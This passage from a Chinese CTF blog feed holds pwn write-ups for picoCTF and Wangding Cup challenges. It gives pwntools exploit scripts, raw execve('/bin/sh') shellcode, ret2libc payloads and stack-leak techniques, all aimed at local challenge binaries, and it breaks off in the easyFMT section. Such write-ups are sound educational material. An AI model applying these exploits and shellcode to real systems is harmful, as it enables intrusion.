  password_input<span class="token punctuation">[</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>password_input<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>password_input<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Incorrect Password!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>看到name 定义为 char name[256];</p>
<p>我们只需要大于0x100长度的字符串即可leak处password</p>
<h4 id="这里先讲一下如何修复"><a href="#这里先讲一下如何修复" class="headerlink" title="这里先讲一下如何修复"></a>这里先讲一下如何修复</h4><p>如果用ida32打开程序的话会无法F5</p>
<p><img src="/2018/10/02/picoctf-Writeup/3.jpg" alt="3"></p>
<p>如图 </p>
<p>这是因为反编译插件无法确定其中函数的参数个数 </p>
<p>解决方法：</p>
<p>跳转到该地址 </p>
<p><img src="/2018/10/02/picoctf-Writeup/4.jpg" alt="4"></p>
<p><img src="/2018/10/02/picoctf-Writeup/5.jpg" alt="5"></p>
<p>进入该函数 按 Y 修改函数约定和参数个数 </p>
<p><img src="/2018/10/02/picoctf-Writeup/6.jpg" alt="6"></p>
<p>然后再按F5</p>
<p>接着切换到main函数 即可成功F5反编译</p>
<p><img src="/2018/10/02/picoctf-Writeup/7.jpg" alt="7"></p>
<p>由于断电 这里先进行本地getflag</p>
<p><img src="/2018/10/02/picoctf-Writeup/Users\TTTR\ios\source\_posts\picoctf-Writeup\8.jpg" alt="8"></p>
<p>leak出本地password</p>
<p>再次输入password即可获取到flag</p>
<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>检查保护</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ checksec shellcode
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/shellcode'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
    RWX:      Has RWX segments
ios@ubuntu:~$
</code></pre>
<p>保护全关 所以只要写入shellcode即可</p>
<p><img src="/2018/10/02/picoctf-Writeup/9.jpg" alt="9"></p>
<p>F5报错 </p>
<p>修复办法 ：</p>
<p>G跟进地址</p>
<p><img src="/2018/10/02/picoctf-Writeup/10.jpg" alt="10"></p>
<p>keypatch该指令 用nop填充</p>
<p><img src="/2018/10/02/picoctf-Writeup/11.jpg" alt="11"></p>
<p>再次按F5</p>
<p><img src="/2018/10/02/picoctf-Writeup/12.jpg" alt="12"></p>
<p>分析代码流程</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-A0h]</span>
  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+9Ch] [ebp-Ch]</span>

  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v5 <span class="token operator">=</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setresgid</span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> v5<span class="token punctuation">,</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Enter a string!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Thanks! Executing now..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>v4传入vuln函数 跟进</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token comment" spellcheck="true">//v4)</span>
<span class="token punctuation">{</span>
  <span class="token function">gets</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//漏洞存在点</span>
  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>溢出偏移 0xA0</p>
<p>使用现有的shellcode 或者生产shellcode</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
context<span class="token punctuation">(</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'i386'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span>
shellcode<span class="token operator">=</span>asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token operator">//</span>现有
shellcode <span class="token operator">=</span> <span class="token string">"\x31\xc0\x31\xdb\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x51\x52\x55\x89\xe5\x0f\x34\x31\xc0\x31\xdb\xfe\xc0\x51\x52\x55\x89\xe5\x0f\x34"</span>
</code></pre>
<p>那么构造exp</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
p <span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./shellcode'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'shellcode'</span><span class="token punctuation">)</span>
bss <span class="token operator">=</span>elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
shellcode <span class="token operator">=</span> <span class="token string">"\x31\xc0\x31\xdb\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x51\x52\x55\x89\xe5\x0f\x34\x31\xc0\x31\xdb\xfe\xc0\x51\x52\x55\x89\xe5\x0f\x34"</span>

payload <span class="token operator">=</span> shellcode<span class="token operator">+</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0xA0</span><span class="token operator">-</span>len<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'bbbb'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x1553155</span><span class="token punctuation">)</span><span class="token operator">//</span>随意给出一个ret地址
p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="got-2-learn-libc"><a href="#got-2-learn-libc" class="headerlink" title="got-2-learn-libc"></a>got-2-learn-libc</h3><p>检查保护</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~$ checksec got2libc
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ubuntu/got2libc'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
ubuntu@ubuntu:~$
</code></pre>
<p>开启PIE NX RELRO</p>
<p>载入ida查看流程</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  __gid_t v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST1C_4</span>

  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setresgid</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_618</span><span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"puts: %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>puts<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fflush %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fflush<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"read: %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>read<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"write: %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>write<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"useful_string: %p\n"</span><span class="token punctuation">,</span> useful_string<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>主流程打印了当前的一些地址  看到还打印了一个useful_string 我们跟进看下 是什么</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token punctuation">.</span>data<span class="token punctuation">:</span><span class="token number">00002030</span>                 public useful_string
<span class="token punctuation">.</span>data<span class="token punctuation">:</span><span class="token number">00002030</span> useful_string   db <span class="token string">'/bin/sh'</span><span class="token punctuation">,</span><span class="token number">0</span>          <span class="token punctuation">;</span> DATA XREF<span class="token punctuation">:</span> main<span class="token operator">+</span>C9↑o
<span class="token punctuation">.</span>data<span class="token punctuation">:</span><span class="token number">00002038</span>                 align 10h
<span class="token punctuation">.</span>data<span class="token punctuation">:</span><span class="token number">00002038</span> _data           ends
</code></pre>
<p>看到存的binsh</p>
<p>跟进vuln函数</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-9Ch]</span>

  <span class="token function">sub_618</span><span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//存在溢出</span>
  <span class="token function">sub_618</span><span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">sub_618</span><span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>漏洞点也很明显</p>
<p>思路：</p>
<p>由于程序打印了puts地址 所以可以根据puts_addr找到libc版本</p>
<p>通过计算libc_base 从而计算出system_addr</p>
<p>题目已给出/bin/sh地址所以我们可以直接构造payload</p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'got2libc'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'got2libc'</span><span class="token punctuation">)</span>
puts_plt_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
puts_got_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>
putsaddr <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
puts<span class="token operator">=</span> putsaddr<span class="token punctuation">[</span><span class="token number">41</span><span class="token punctuation">:</span><span class="token number">49</span><span class="token punctuation">]</span>
binsh<span class="token operator">=</span> putsaddr<span class="token punctuation">[</span><span class="token number">120</span><span class="token punctuation">:</span><span class="token number">128</span><span class="token punctuation">]</span>
<span class="token comment" spellcheck="true">#puts_plt = 0xf7e0618</span>
<span class="token comment" spellcheck="true">#puts_got = 0xf7e01fe4</span>
<span class="token comment" spellcheck="true">#payload = 'A'*0x9C+'bbbb'+p32(puts_plt)+p32(0xf7e0803)+p32(puts_got)</span>

<span class="token comment" spellcheck="true">#p.sendline(payload)</span>
<span class="token comment" spellcheck="true">#log.info(p.recvuntil('Thanks! Exiting now...\n'))</span>
<span class="token comment" spellcheck="true">#data = p.recvuntil('\n', drop=True)</span>
<span class="token comment" spellcheck="true">#puts = u32(data.ljust(4,'\x00'))</span>

system <span class="token operator">=</span> int<span class="token punctuation">(</span>puts<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x05fca0</span><span class="token operator">+</span><span class="token number">0x03ada0</span>

payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x9C</span><span class="token operator">+</span><span class="token string">'bbbb'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x1553155</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>int<span class="token punctuation">(</span>binsh<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>注意str与int的转换</p>
<p>这里的system计算是通过<a href="https://libc.blukat.me" target="_blank" rel="noopener">https://libc.blukat.me</a></p>
<p><img src="/2018/10/02/picoctf-Writeup/13.jpg" alt="13"></p>
<p><img src="/2018/10/02/picoctf-Writeup/14.jpg" alt="14"></p>
<p>成功拿到shell</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;buffer-overflow-0&quot;&gt;&lt;a href=&quot;#buffer-overflow-0&quot; class=&quot;headerlink&quot; title=&quot;buffer overflow 0&quot;&gt;&lt;/a&gt;buffer overflow 0&lt;/h3&gt;&lt;p&gt;查看程序源代码&lt;/p
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>网鼎杯部分PWN-Writeup</title>
    <link href="http://iosmosis.github.io/2018/08/22/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%83%A8%E5%88%86PWN-Writeup/"/>
    <id>http://iosmosis.github.io/2018/08/22/网鼎杯部分PWN-Writeup/</id>
    <published>2018-08-22T04:58:03.000Z</published>
    <updated>2019-09-12T04:46:11.634Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第一场"><a href="#第一场" class="headerlink" title="第一场"></a>第一场</h2><h3 id="GUESS"><a href="#GUESS" class="headerlink" title="GUESS"></a>GUESS</h3><p>SSP leak flag</p>
<p>这次学到了一个知识点 environ存在栈地址</p>
<p>三次leak得到flag</p>
<p>先根据got去libc database，然后确认libc，然后去泄露libc.symbols[“environ”]，这个里边存的是栈地址。</p>
<h4 id="第一次-leak-puts函数地址"><a href="#第一次-leak-puts函数地址" class="headerlink" title="第一次 leak puts函数地址"></a>第一次 leak puts函数地址</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">300</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You should take more effort to get six sence, and one more challenge!!\n"</span><span class="token punctuation">)</span>
puts <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">:</span><span class="token number">33</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>
puts <span class="token operator">=</span> u64<span class="token punctuation">(</span>puts_real<span class="token punctuation">)</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts<span class="token punctuation">)</span>
</code></pre>
<p>通过 puts_addr 查找libc版本</p>
<p><img src="/2018/08/22/网鼎杯部分PWN-Writeup/2.jpg" alt="2"></p>
<h4 id="第二次-leak-environ"><a href="#第二次-leak-environ" class="headerlink" title="第二次 leak environ"></a>第二次 leak environ</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">environ <span class="token operator">=</span> puts<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'environ'</span><span class="token punctuation">]</span>
payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>environ<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">300</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You should take more effort to get six sence, and one more challenge!!\n"</span><span class="token punctuation">)</span>
flag_addr <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">:</span><span class="token number">33</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>
flag_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x168</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span>
</code></pre>
<h4 id="第三次-leak-flag"><a href="#第三次-leak-flag" class="headerlink" title="第三次 leak flag"></a>第三次 leak flag</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">300</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span class="token keyword">print</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./GUESS'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'GUESS'</span><span class="token punctuation">)</span>

libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>

puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>

payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">300</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'You should take more effort to get six sence, and one more challenge!!\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

puts <span class="token operator">=</span>  u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">:</span><span class="token number">33</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts<span class="token punctuation">)</span>

environ <span class="token operator">=</span> puts<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"environ"</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>environ<span class="token punctuation">)</span>
payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>environ<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">300</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You should take more effort to get six sence, and one more challenge!!\n"</span><span class="token punctuation">)</span>

flag_addr <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">:</span><span class="token number">33</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>
flag_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x168</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span>
payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">300</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span class="token keyword">print</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
</code></pre>
<p>得到flag</p>
<p><img src="/2018/08/22/网鼎杯部分PWN-Writeup/3.jpg" alt="3"></p>
<h2 id="第二场"><a href="#第二场" class="headerlink" title="第二场"></a>第二场</h2><h3 id="easyFMT"><a href="#easyFMT" class="headerlink" title="easyFMT"></a>easyFMT</h3><p>检查保护</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ checksec <span class="token function">fmt</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/fmt'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
ios@ubuntu:~$
</code></pre>
<p>NX开启</p>
<p>载入ida分析</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
